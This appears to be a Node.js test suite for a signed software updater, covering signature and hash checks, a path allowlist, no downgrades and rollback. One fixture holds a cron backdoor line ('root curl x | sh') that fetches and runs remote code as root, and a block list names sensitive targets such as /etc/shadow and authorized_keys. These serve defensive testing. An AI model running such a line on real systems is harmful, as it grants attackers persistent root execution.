'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const cp = require('child_process');
const lib = require('../lib');
const { createUpdater } = require('../updater');

const TAR = process.platform === 'win32' ? path.join(process.env.SystemRoot || 'C:\Windows', 'System32', 'tar.exe') : 'tar';
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'agentos-upd-'));
const keys = () => crypto.generateKeyPairSync('ed25519');
const pubPem = (k) => k.publicKey.export({ type: 'spki', format: 'pem' });

// Dựng một "cửa hàng" bản cập nhật: files = { 'opt/agentos/VERSION': '2.0\n', ... }; trả { dir (nơi phục vụ), manifest }
function publish(files, version, key, extra) {
  extra = extra || {};
  const dir = tmp(), stage = tmp();
  for (const [rel, content] of Object.entries(files)) {
    const p = path.join(stage, ...rel.split('/'));
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, content);
  }
  const file = 'agentos-update-' + version + '.tar.gz';
  const r = cp.spawnSync(TAR, ['-czf', path.join(dir, file), '-C', stage, ...fs.readdirSync(stage)], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  const buf = fs.readFileSync(path.join(dir, file));
  const manifest = Object.assign({ version, file, size: buf.length, sha256: crypto.createHash('sha256').update(buf).digest('hex'), date: '2026-10-21', notes: 'thử' }, extra.manifest || {});
  const mbuf = Buffer.from(JSON.stringify(manifest));
  fs.writeFileSync(path.join(dir, 'manifest.json'), mbuf);
  fs.writeFileSync(path.join(dir, 'manifest.json.sig'), crypto.sign(null, mbuf, (extra.signWith || key).privateKey).toString('base64'));
  return { dir, manifest, file };
}
const serve = (dir) => async (url) => {
  const name = String(url).split('/').pop();
  try { const b = fs.readFileSync(path.join(dir, name)); return { ok: true, status: 200, arrayBuffer: async () => b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength) }; }
  catch (e) { return { ok: false, status: 404 }; }
};

// Một "máy" giả: gốc hệ thống tạm có phiên bản cũ + khóa công khai
function machine(key, version) {
  const root = tmp(), state = tmp();
  const w = (rel, c) => { const p = path.join(root, ...rel.split('/')); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
  w('opt/agentos/VERSION', version + '\n');
  w('etc/agentos/update-pubkey.pem', pubPem(key));
  w('opt/agentos/orchestrator/src/index.js', 'CU\n');
  w('opt/agentos/orchestrator/src/giu-nguyen.js', 'GIU\n');
  w('usr/local/bin/agentos-key', 'CU-KEY\n');
  const rd = (rel) => { try { return fs.readFileSync(path.join(root, ...rel.split('/')), 'utf8'); } catch (e) { return null; } };
  return { root, state, w, rd, resultFile: path.join(tmp(), 'update-result.json') };
}
const upd = (m, dir, extra) => createUpdater(Object.assign({ root: m.root, stateDir: m.state, resultFile: m.resultFile, fetch: serve(dir), systemd: false, tar: TAR, log() {} }, extra || {}));

// ---------- lib ----------
test('lib: so phiên bản, từ chối chữ ký sai/manifest bị sửa/trường không hợp lệ', () => {
  assert.equal(lib.cmpVersion('2026.10.21.1', '2026.10.20.9'), 1);
  assert.equal(lib.cmpVersion('1.0', '1.0.0'), 0);
  assert.equal(lib.cmpVersion('1.9', '1.10'), -1);
  const k = keys(), other = keys();
  const good = Buffer.from(JSON.stringify({ version: '2.0', file: 'a.tar.gz', size: 10, sha256: 'a'.repeat(64) }));
  const sig = crypto.sign(null, good, k.privateKey).toString('base64');
  assert.equal(lib.verifyManifest(good, sig, pubPem(k)).ok, true);
  assert.equal(lib.verifyManifest(good, sig, pubPem(other)).ok, false);                          // khóa khác
  assert.equal(lib.verifyManifest(Buffer.from(good.toString().replace('2.0', '9.9')), sig, pubPem(k)).ok, false);   // manifest bị sửa
  assert.equal(lib.verifyManifest(good, 'khong-phai-base64!!', pubPem(k)).ok, false);
  for (const bad of [{ version: 'x' }, { file: '../a.tar.gz' }, { sha256: 'zz' }, { size: -1 }, { file: 'a.zip' }]) {
    const b = Buffer.from(JSON.stringify(Object.assign({ version: '2.0', file: 'a.tar.gz', size: 10, sha256: 'a'.repeat(64) }, bad)));
    assert.equal(lib.verifyManifest(b, crypto.sign(null, b, k.privateKey).toString('base64'), pubPem(k)).ok, false, JSON.stringify(bad));
  }
});

test('lib.checkEntries: chỉ nhận đường dẫn cho phép; chặn .., tuyệt đối, hệ thống, tệp ngoài danh sách', () => {
  const ok = ['opt/agentos/orchestrator/src/index.js', 'opt/agentos/wizard/public/index.html', 'opt/agentos/VERSION', 'usr/local/bin/agentos-key', 'etc/systemd/system/agentos-update.path',
    'etc/systemd/system/tailscaled.service.d/10-agentos-operator.conf', 'usr/share/applications/agentos-gemini.desktop', 'etc/agentos/update-pubkey.pem', 'apply.sh'];
  assert.equal(lib.checkEntries(ok).ok, true);
  const bad = ['etc/passwd', '../etc/passwd', '/etc/shadow', 'opt/agentos/../../etc/x', 'usr/local/bin/ls', 'etc/sudoers.d/90-x', 'etc/cron.d/x', 'opt/agentos/orchestrator/node_modules/x.js', 'root/.ssh/authorized_keys', 'etc/systemd/system/ssh.service', 'opt\\agentos\\VERSION'];
  const r = lib.checkEntries(bad);
  assert.equal(r.ok, false); assert.equal(r.bad.length, bad.length);
});

// ---------- cập nhật đầy đủ ----------
test('apply: gói hợp lệ -> thay tệp, thêm tệp mới, giữ tệp khác, cập nhật VERSION, ghi kết quả, quyền thực thi cho /usr/local/bin', async () => {
  const k = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n', 'opt/agentos/orchestrator/src/index.js': 'MOI\n', 'opt/agentos/orchestrator/src/moi.js': 'THEM\n', 'usr/local/bin/agentos-key': 'MOI-KEY\n' }, '2.0', k);
  const r = await upd(m, p.dir).apply();
  assert.equal(r.ok, true); assert.deepEqual([r.from, r.to], ['1.0', '2.0']);
  assert.equal(m.rd('opt/agentos/VERSION'), '2.0\n'); assert.equal(m.rd('opt/agentos/orchestrator/src/index.js'), 'MOI\n');
  assert.equal(m.rd('opt/agentos/orchestrator/src/moi.js'), 'THEM\n'); assert.equal(m.rd('opt/agentos/orchestrator/src/giu-nguyen.js'), 'GIU\n');
  if (process.platform !== 'win32') assert.equal(fs.statSync(path.join(m.root, 'usr/local/bin/agentos-key')).mode & 0o777, 0o755);
  const res = JSON.parse(fs.readFileSync(m.resultFile, 'utf8')); assert.equal(res.ok, true); assert.equal(res.to, '2.0'); assert.ok(res.at);
  assert.equal(fs.existsSync(path.join(m.root, 'opt/agentos/orchestrator/src/index.js.agentos-new')), false);   // không để tệp tạm
  // chạy lại: đã mới nhất
  assert.equal((await upd(m, p.dir).apply()).upToDate, true);
});

test('apply: không hạ phiên bản; check báo đúng', async () => {
  const k = keys(), m = machine(k, '3.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n' }, '2.0', k);
  assert.equal((await upd(m, p.dir).apply()).upToDate, true);
  assert.equal(m.rd('opt/agentos/VERSION'), '3.0\n');
  const c = await upd(m, p.dir).check(); assert.deepEqual([c.installed, c.latest, c.newer], ['3.0', '2.0', false]);
  const m2 = machine(k, '1.0'); const c2 = await upd(m2, p.dir).check(); assert.equal(c2.newer, true);
});

test('apply: gói ký bằng khóa LẠ bị từ chối, không đổi gì', async () => {
  const k = keys(), attacker = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '9.0\n', 'opt/agentos/orchestrator/src/index.js': 'DOC\n' }, '9.0', attacker);
  const r = await upd(m, p.dir).apply();
  assert.equal(r.ok, false); assert.equal(r.code, 'fetch'); assert.match(r.error, /Chữ ký/);
  assert.equal(m.rd('opt/agentos/orchestrator/src/index.js'), 'CU\n'); assert.equal(m.rd('opt/agentos/VERSION'), '1.0\n');
});

test('apply: gói bị sửa sau khi ký (sha256 không khớp) bị từ chối', async () => {
  const k = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n', 'opt/agentos/orchestrator/src/index.js': 'MOI\n' }, '2.0', k);
  const fp = path.join(p.dir, p.file), b = fs.readFileSync(fp); b[b.length - 20] ^= 0xff; fs.writeFileSync(fp, b);
  const r = await upd(m, p.dir).apply();
  assert.equal(r.ok, false); assert.equal(r.code, 'hash'); assert.equal(m.rd('opt/agentos/orchestrator/src/index.js'), 'CU\n');
});

test('apply: gói (đã ký) chứa đường dẫn ngoài danh sách cho phép bị từ chối', async () => {
  const k = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n', 'etc/cron.d/backdoor': '* * * * * root curl x | sh\n' }, '2.0', k);
  const r = await upd(m, p.dir).apply();
  assert.equal(r.ok, false); assert.equal(r.code, 'bundle'); assert.match(r.error, /không được phép/);
  assert.equal(m.rd('etc/cron.d/backdoor'), null); assert.equal(m.rd('opt/agentos/VERSION'), '1.0\n');
});

test('apply: apply.sh chạy được (có biến AGENTOS_FROM/TO); apply.sh lỗi -> KHÔI PHỤC toàn bộ, xóa tệp mới', async () => {
  if (process.platform === 'win32') return;
  const k = keys(), m = machine(k, '1.0');
  const okp = publish({ 'opt/agentos/VERSION': '2.0\n', 'opt/agentos/orchestrator/src/index.js': 'MOI\n', 'apply.sh': 'echo "$AGENTOS_FROM->$AGENTOS_TO" > "$AGENTOS_ROOT/opt/agentos/da-chay.txt"\n' }, '2.0', k);
  assert.equal((await upd(m, okp.dir).apply()).ok, true);
  assert.equal(m.rd('opt/agentos/da-chay.txt'), '1.0->2.0\n');

  const m2 = machine(k, '1.0');
  const bad = publish({ 'opt/agentos/VERSION': '2.0\n', 'opt/agentos/orchestrator/src/index.js': 'HONG\n', 'opt/agentos/orchestrator/src/moi.js': 'X\n', 'apply.sh': 'exit 7\n' }, '2.0', k);
  const r = await upd(m2, bad.dir).apply();
  assert.equal(r.ok, false); assert.equal(r.code, 'apply.sh'); assert.equal(r.rolledBack, true);
  assert.equal(m2.rd('opt/agentos/orchestrator/src/index.js'), 'CU\n'); assert.equal(m2.rd('opt/agentos/orchestrator/src/moi.js'), null); assert.equal(m2.rd('opt/agentos/VERSION'), '1.0\n');
  assert.equal(JSON.parse(fs.readFileSync(m2.resultFile, 'utf8')).ok, false);
});

test('apply: dịch vụ không chạy ổn sau khi cập nhật -> khôi phục bản cũ và khởi động lại bản cũ', async () => {
  const k = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n', 'opt/agentos/orchestrator/src/index.js': 'LOI-CU-PHAP\n' }, '2.0', k);
  const log = []; let broken = false;
  const run = async (cmd, args) => {
    if (cmd !== 'systemctl') return require('child_process').spawnSync(cmd, args, { encoding: 'utf8' }).status === 0 ? { code: 0, out: '', err: '' } : { code: 1, out: '', err: '' };
    log.push(args.join(' '));
    if (args[0] === 'is-active') return { code: args[2] === 'agentos-orchestrator.service' && broken ? 3 : 0, out: '', err: '' };
    if (args[0] === 'restart' && fs.readFileSync(path.join(m.root, 'opt/agentos/orchestrator/src/index.js'), 'utf8').startsWith('LOI')) broken = true;
    if (args[0] === 'restart' && fs.readFileSync(path.join(m.root, 'opt/agentos/orchestrator/src/index.js'), 'utf8') === 'CU\n') broken = false;
    return { code: 0, out: '', err: '' };
  };
  // run mặc định cho tar: dùng execFile thật
  const real = (cmd, args, opts) => new Promise((res) => cp.execFile(cmd, args, Object.assign({ maxBuffer: 1 << 24 }, opts || {}), (e, o, er) => res({ code: e ? (typeof e.code === 'number' ? e.code : 1) : 0, out: String(o || ''), err: String(er || '') })));
  const r = await upd(m, p.dir, { systemd: true, healthWaitsMs: [1], sleep: async () => {}, run: (c, a, o) => (c === 'systemctl' ? run(c, a) : real(c === 'tar' ? TAR : c, a, o)) }).apply();
  assert.equal(r.ok, false); assert.equal(r.code, 'health'); assert.equal(r.rolledBack, true); assert.match(r.error, /agentos-orchestrator/);
  assert.equal(m.rd('opt/agentos/orchestrator/src/index.js'), 'CU\n'); assert.equal(m.rd('opt/agentos/VERSION'), '1.0\n');
  assert.ok(log.filter((x) => x === 'restart agentos-orchestrator.service').length >= 2);                  // một lần bản mới, một lần bản cũ khôi phục
});

test('apply: đang có lần cập nhật khác (khóa) -> báo bận, không chạy song song', async () => {
  const k = keys(), m = machine(k, '1.0');
  const p = publish({ 'opt/agentos/VERSION': '2.0\n' }, '2.0', k);
  fs.mkdirSync(m.state, { recursive: true }); fs.writeFileSync(path.join(m.state, 'lock'), '');
  const r = await upd(m, p.dir).apply();
  assert.equal(r.code, 'busy'); assert.equal(m.rd('opt/agentos/VERSION'), '1.0\n');
});

test('build-bundle: gói thật từ kho mã có chữ ký hợp lệ, chỉ chứa đường dẫn được phép và KHÔNG chứa test/node_modules/khóa riêng', () => {
  const k = keys(), dir = tmp(), keyFile = path.join(dir, 'k.pem');
  fs.writeFileSync(keyFile, k.privateKey.export({ type: 'pkcs8', format: 'pem' }));
  const out = path.join(dir, 'out');
  const r = cp.spawnSync(process.execPath, [path.join(__dirname, '..', 'build-bundle.js'), '--key', keyFile, '--version', '99.0.0.1', '--notes', 'thử', '--out', out], { encoding: 'utf8', env: Object.assign({}, process.env, { AGENTOS_BUILD_NO_VERSION_FILE: '1' }) });
  assert.equal(r.status, 0, r.stderr + r.stdout);
  const mbuf = fs.readFileSync(path.join(out, 'manifest.json')), sig = fs.readFileSync(path.join(out, 'manifest.json.sig'), 'utf8');
  const v = lib.verifyManifest(mbuf, sig, pubPem(k)); assert.equal(v.ok, true, v.error);
  const names = cp.spawnSync(TAR, ['-tzf', path.join(out, v.manifest.file)], { encoding: 'utf8' }).stdout.split(/\r?\n/).map((s) => s.replace(/^\.\//, '')).filter((s) => s && !s.endsWith('/'));
  assert.deepEqual(lib.checkEntries(names), { ok: true, bad: [] });
  assert.ok(names.includes('opt/agentos/VERSION') && names.includes('opt/agentos/orchestrator/src/index.js') && names.includes('usr/local/bin/agentos-update') && names.includes('opt/agentos/update/updater.js'));
  assert.ok(!names.some((n) => /\/test\/|node_modules|\.pem$/.test(n)), 'có tệp không nên đóng gói');
});
